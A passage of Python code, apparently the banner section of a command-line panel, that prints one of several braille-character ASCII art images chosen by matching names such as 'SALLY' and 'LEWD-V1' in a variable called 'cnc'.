                print(' ⢼⣿⣿⣿⣿⣿⣿⣾⣾⣧⠄⠀⣀⠀⠩⠄⠀⠠⠄⠀⠀⠀⠀⠀⠀⠀⠈⢬⡛⢻⣟⣛⢁⠀⢀⡄⢀⠁⡀⢀⣀⢈⠛⠛⣉⣤⣶⣶⣦⡙⢻⣿⣿⣿⣿⣿⣿')
                print(' ⠸⡿⢿⣿⡿⣿⣿⣿⠟⣠⣴⣿⣿⣿⣷⣶⣤⡄⣀⠠⠤⠭⣭⣿⣿⣶⣄⡀⣿⣶⡌⠃⢀⣴⣬⣤⣤⡥⢚⣋⣤⡾⠀⣾⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿')
                print(' ⣼⣿⣿⣿⣿⣿⣿⠇⣴⣿⣿⣿⡿⠛⠙⣿⡟⢸⣿⣶⣄⠲⢾⣶⣿⣿⣿⣧⡈⣿⣿⠀⣼⣿⣫⣿⣿⣿⣧⡅⢂⣵⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⠃⣸⣿⣿⡿⢋⣤⣶⣿⣿⠁⣿⣿⣿⣿⣇⠰⣯⣉⠛⠿⣿⣿⣼⣿⠀⢻⣿⣿⣿⠿⢋⡥⣲⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣼⣿⣿⣿⡿⠃⣼⣿⣿⣏⣰⣿⣿⣿⣿⣿⢰⣿⣿⣿⣿⣿⣦⠈⢻⣿⠃⣰⣿⣿⡇⢀⡎⢿⣷⣶⣆⠉⣠⣿⣿⣿⣿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢼')
                print(' ⣿⣿⣿⠟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⠜⠋⣾⣿⣿⡿⢀⣿⣷⡈⢿⣿⣿⣆⠻⢿⣿⣿⣿⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼')
                print(' ⣿⡿⣧⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⠟⣡⡄⢸⣿⣿⣿⠇⣾⣿⣿⣷⠸⣿⣿⣿⣦⠠⡈⢿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣉⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣿⡿⠿⢟⣠⣾⣿⡇⣼⣿⣿⡿⢸⣿⣿⣿⣿⡇⢹⣿⣿⣿⡇⢻⣦⡙⢇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡜⢀⣴⣿⣿⣿⣿⡇⢹⣿⣿⠃⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⡇⢸⣿⣷⣄⢸⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⢿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⣰⠆⢡⣾⣿⣿⣿⣿⣿⡧⠘⠿⠇⠀⢸⣿⣿⣿⣿⡇⠀⢹⣿⣿⠃⣼⣿⣿⣿⡈⣯⠠⣽⠻⣿⣿⣿⣿⣿⣿⣿⣿')
                
                
                       
                
        elif "SALLY" in cnc:
            print('             ⠀⠀ ⢀⡀⠤⠤⠠⡖⠲⣄⣀  ')
            print('⠀⠀⠀⠀⠀⡠⠶⣴⣶⣄⠀⠀⠀⢀⣴⣞⣼⣴⣖⣶⣾⡷⣶⣿⣿⣷⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢸⠀⠀⠀⠙⢟⠛⠴⣶⣿⣿⠟⠙⣍⠑⢌⠙⢵⣝⢿⣽⡮⣎⢿⡦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⢱⡶⣋⠿⣽⣸⡀⠘⣎⢢⡰⣷⢿⣣⠹⣿⢸⣿⢿⠿⡦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⢧⡿⣇⡅⣿⣇⠗⢤⣸⣿⢳⣹⡀⠳⣷⣻⣼⢿⣯⡷⣿⣁⠒⠠⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⣼⣿⣧⡏⣿⣿⢾⣯⡠⣾⣸⣿⡿⣦⣙⣿⢹⡇⣿⣷⣝⠿⣅⣂⡀⠀⠡⢂⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⣿⡟⣿⡇⡏⣿⣽⣿⣧⢻⡗⡇⣇⣤⣿⣿⣿⣧⣿⣿⡲⣭⣀⡭⠛⠁⠀⠀⠈⠀⠉⢂⢄⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⢻⣿⣇⣥⣏⣘⣿⣏⠛⠻⣷⠿⡻⡛⠷⡽⡿⣿⣿⣿⣷⠟⠓⠉⠢⢄⡀⠀⠀⠀⠀⠀⠁⠫⢢⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⢸⣾⣿⣽⣿⣏⣻⠻⠁⢠⠁⠀⠀⠀⠘⣰⣿⣿⢟⢹⢻⠀⠀⠀⠀⠀⠈⠒⢄⡀⠀⠀⠀⠀⠀⠀⠑⢄')
            print('⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⢸⣯⣿⣿⣿⢷⡀⠀⠀⠀⠀⠀⠀⠀⠛⣩⣿⣿⢿⣾⣸⠀⠀⠀⠀⠀⠀⢀⡠⠚⠉⠉⠁⠀⠀⠀⢀⠌')
            print('⠀⠀⠀⠀⠀⠀⠀⢡⠀⠀⠀⢟⣿⣯⡟⠿⡟⢇⡀⠀⠀⠐⠁⢀⢴⠋⡼⢣⣿⣻⡏⠀⠀⠀⣀⠄⠂⠁⠀⠀⠀⠀⠀⠀⢀⡤⠂⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠈⠊⢻⣿⣜⡹⡀⠈⠱⠂⠤⠔⠡⢶⣽⡷⢟⡿⠕⠒⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⡠⠐⠁⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⢿⠿⠿⢿⠾⣽⡀⠀⠀⠀⠈⠻⣥⣃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠒⠁⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡀⡀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣖⠂⠠⠐⠋⠀⠙⠳⣤⣠⠀⠀⠀⣀⠤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠵⡐⠄⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⡀⠀⠠⡀⠀⠈⠙⠶⣖⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡥⠈⠂⠀⠀⠀⠀⠀⠀⠀⣼⠉⠙⠲⣄⠈⠣⡀⠀⠀⠈⢻⡦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠈⣷⡄⠈⠄⠀⠀⠀⢧⠀ ⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⡀⠀⢠⣿⣤⣤⣶⣶⣾⣿⣿⡄⢸⠀⠀⠀⢸⣄⣤⣼⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠇⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⠀⠀⠀⣼⣿⣿⣿⡿')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢀⣼⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠁⠀⠈⠉⠙⠛⠿⠿⠽⠿⠟⠛⡉⠛⠲⣿⣿⠿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⢠⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⠀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢔⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠊⠀⠀⠀⠀⠀⣃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⡠⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⢫⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⣰⡿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⣼⠏⣸⣿⣷⢷⠙⣻⢶⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠉⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠰⣏⠀⣿⣿⡘⣼⡇⠀⠁⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣽⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢙⠓⠛⠘⣧⠾⢷⣄⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀ ⣿⢟⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠸⠀⠀⠀⢸⣧⠀⠹⣆⠀⠀⠀⠀⠈⢻⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀ ⣿⢂⠙⢿⡷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⢃⠀⠀⠈⠙⠀⠀⠻⡄⠀⠀⠀⠀⠸⡀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠐⠠⠀⠻⠬⠄⡒⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠑⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
             
        elif "LEWD-V1" in cnc:             
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣛⣋⣭⣭⣭⣭⣭⣙⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣥⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣍⠻⣿⣿⣿⣿⣿⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠻⣿⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈⣸⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠳⡹⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡐⢼⣿⣿⢻⣿⣿⢻⣿⢸⣿⢻⣿⡇⣸⢿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⡇⠁⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢠⠃⣾⣿⢃⣾⣇⣧⡟⠇⢾⣏⡞⠘⠀⣾⢸⣿⣿⢸⣿⣿⡟⢿⣿⣿⣿⡇⢀⢸⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡸⠀⡿⣿⠈⣿⢸⣿⠃⠀⣿⣿⠃⠀⠆⠙⠈⢿⣿⢸⣿⣿⡇⢸⣿⣿⣿⡇⢸⢸⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠃⢸⡃⡇⠀⡇⣼⡿⠐⠀⠿⠋⠀⣰⡇⠈⠀⢿⣿⣿⣿⡿⢁⠀⢦⠙⣿⡇⡜⣸⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠰⢿⡅⠁⠀⡇⡄⠀⢀⡀⠀⠀⢀⣀⡀⠀⠀⠀⠈⠉⠉⠁⠈⠀⠈⠀⠁⠀⠁⠉⣻⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣀⠀⠀⡅⠀⠀⢸⡏⠀⠀⢸⣿⠛⠃⠀⢻⡇⣸⡇⢸⡇⠀⢸⡟⠳⣶⠀⠀⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⣜⣷⠀⠀⠇⠀⠀⣺⡇⠀⠀⢸⣿⠶⠀⠀⢸⣷⡿⣷⣿⠇⠀⢸⡇⢰⣿⠀⠀⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⢸⡛⠀⠀⠀⠀⠀⠿⣷⡆⠀⢸⣿⣤⠀⠀⠘⣿⠇⣿⡟⠀⠀⣼⣇⣸⡿⠀⠀⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⡇⠀⠀⠀⢀⣀⣀⡀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠈⠁⠀⠀⠈⠉⠉⠁⠀⠀⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣸⠁⠀⠀⠀⠀⢿⣿⡇⢩⣿⣿⣿⣿⣿⣿⣿⣿⣩⣿⡿⢛⡟⢀⡟⠁⣿⣿⣾⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣡⣤⣤⣤⣄⡀⠀⠀⠈⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠀⣼⡇⣸⣿⣿⣿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠸⣿⡆⢉⠻⢿⣿⣏⣁⣼⡿⠛⠁⠀⠀⢰⣿⠁⣛⣛⡛⠿⣿⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⡟⣸⣿⣿⠻⠿⣿⣿⣿⡿⣿⣷⡀⠀⢻⡇⠘⣷⣄⣌⡙⠋⠁⠀⠀⣀⣤⠄⢸⡏⣸⣿⣿⣿⣷⢹⣿')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⠁⣿⣿⣿⣷⣶⣿⣿⣿⡇⢹⣿⣷⠀⠀⣷⢠⠈⠉⢿⠁⠾⣿⣿⡿⠃⡼⠀⡟⢀⣿⣿⣿⣿⣿⡇⢻')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⠐⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⣿⣿⡆⠀⠘⠀⡓⠄⠀⢠⣈⠛⠋⣠⣾⡇⠀⠀⣸⠋⢹⣿⣿⣿⡇⢸')
            print(' ⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⢹⣿⣿⠀⠀⠀⣿⣶⣤⣙⣿⣠⣾⣿⣿⡇⠀⠀⡇⠀⣼⣿⣿⣿⡇⣼')
            print(' ⣿⣿⣿⣿⣿⣿⡿⢁⡄⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠈⠋⣻⡇⠰⠀⢻⣿⣿⣿⣿⣿⢻⣿⣿⡇⣶⠀⡇⠀⣿⣿⣿⣿⠁⣿')
            print(' ⣿⣿⣿⣿⣿⡟⠠⠸⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢠⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠘⣿⣿⡇⠛⠐⣿⣦⡙⢿⣿⣿⢰⣿')
            print(' ⣿⣿⣿⣿⠟⠀⢠⠇⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⣸⣿⣿⣿⣮⣿⣷⡘⢿⣧⠀⠀⢿⣿⣿⠦⡙⣿⢸⣿')
            print(' ⣿⣿⣿⡟⣀⢠⡟⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣿⣿⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣌⢿⣇⠀⢸⣿⣿⣿⣿⣆⢸⣿')
            print(' ⣿⣿⡿⢠⣷⣾⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⡷⠀⠀⣿⡣⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⡆⢸⣿⣿⣿⣿⣿⠌⢿')
            print(' ⣿⣿⠁⠸⣿⠃⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⡇⠀⠀⣯⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⢥⣾⣿⣿⣿⣿⣿⠆⢸')
            print(' ⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶')


        elif "LEWD-V2" in cnc:
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⢟⣁⡤⠶⠴⠯⠄⣀⣠⡴⠦⣤⣀⠀⠛⡿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠵⠛⠁⣀⣤⡤⠐⠒⠘⣩⠤⣄⠀⠉⠳⣄⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⡿⠁⢀⣤⠞⠋⠁⣠⣴⠶⢾⣧⣀⠀⠑⢦⡀⠉⢦⠀⠈⢻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⠏⠀⣰⠟⠁⢀⣴⠛⢁⠀⠀⠀⠉⠉⠳⡄⠀⠙⣆⠘⡇⠀⢠⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣼⡿⠃⢀⡾⢻⡀⢀⡞⠁⠀⣿⠁⠀⠀⡀⢶⡰⣝⢆⠀⠈⢷⣱⡄⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⣼⡟⠀⢠⡿⠁⠘⢣⣿⠀⠀⣰⡃⠀⠀⣸⣷⠀⢳⠘⣿⣧⠀⠈⠳⢻⡄⠀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣰⡟⠀⣠⡾⠃⠀⢸⣿⣿⠧⢴⡿⠽⢿⣷⣿⠘⢷⣀⣧⡈⣿⣆⠀⠀⡌⢷⡀⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⣿⠃⠀⣼⣿⣿⣿⣷⣮⣯⣍⣳⣿⠃⠀⠘⢿⣿⣇⢸⣿⣆⠀⣷⡘⣷⡀⢹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠀⣰⡏⠀⢀⣿⣿⢿⣿⣿⣿⣏⣽⡿⠃⠀⠀⠀⠈⠻⣿⣾⣿⡿⠛⢿⣷⣿⣧⣿⡟⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⣿⣇⠀⣿⡟⣿⣿⣧⣾⣿⠿⠋⠒⢲⣚⣛⠁⠀⠀⢸⣿⡟⣀⠉⢈⣿⣿⣿⣿⡟⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣄⣸⣿⢿⣧⣿⠃⠀⠒⠛⢻⠇⠀⠀⠀⠛⢻⢿⣿⣶⣤⣼⠟⠃⢿⢀⣼⣿⣿⣿⣿⠁⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢻⣿⡌⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⠛⠁⣼⠏⠀⣠⣤⣾⣿⣿⢹⣿⣼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠾⢿⡟⢿⣾⣿⣿⣻⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠚⠁⠀⣰⣿⣿⢻⣿⡟⠋⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡏⢿⣿⣧⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⣿⣿⣿⣏⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣼⣿⣿⣿⣿⣿⡯⠉⢷⣄⠀⠀⠀⠀⠀⢀⣀⡴⢿⢉⡾⢰⣿⣿⣿⣿⡀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⣿⡳⠦⣤⣴⡾⠟⠉⣰⡿⠛⠁⠀⣙⣿⣿⣿⣿⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⣀⣠⡤⢆⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⢿⡤⣽⠋⠀⣀⣴⣿⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠐⠉⠁⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⡀⠘⠷⡎⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⠀⠀⠀⠀⠀')
            print('⠀⠀⣀⣨⡗⠀⢀⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀')
            print('⠀⢠⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⢿⢿⣭⣿⣿⣿⣿⣷⣖⣒⣒⣀⢠⡄⡩⢙⣛⡛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠸⣿⡿⠟⠻⣿⣿⣿⡇⠀⠀⠀')
            print('⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣷⣾⣿⣿⣿⣷⣄⣰⠁⣶⣰⣤⣦⣤⣤⣶⡾⠿⢿⣻⢿⣿⣶⠆⠀⠀⠐⣦⠀⢸⣿⣿⣷⠀⠀⠀')
